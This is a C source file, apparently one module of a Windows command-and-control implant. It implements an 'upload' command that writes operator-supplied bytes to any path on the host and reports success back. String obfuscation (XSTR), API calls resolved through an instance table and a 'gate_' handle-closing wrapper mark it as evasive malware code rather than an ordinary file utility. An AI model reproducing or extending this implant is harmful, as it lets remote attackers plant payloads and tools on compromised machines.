#include "config.h"
#ifdef INCLUDE_CMD_UPLOAD

#include "commands.h"

VOID cmd_upload(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);
    DWORD data_len = 0;
    BYTE* data = parser_bytes(args, &data_len);

    if (!path || path_len == 0) {
        package_add_string(inst, response, XSTR("No path specified"));
        response->is_error = TRUE;
        return;
    }

    char pathbuf[MAX_PATH] = {0};
    es_memcpy(pathbuf, path, path_len < MAX_PATH-1 ? path_len : MAX_PATH-1);

    HANDLE hFile = inst->Win32.CreateFileA(
        pathbuf, GENERIC_WRITE, 0, NULL,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        package_add_string(inst, response, XSTR("Failed to create file"));
        response->is_error = TRUE;
        return;
    }

    if (data && data_len > 0) {
        DWORD written = 0;
        inst->Win32.WriteFile(hFile, data, data_len, &written, NULL);
    }

    gate_CloseHandle(inst, hFile);
    package_add_string(inst, response, XSTR("Upload complete"));
}

#endif
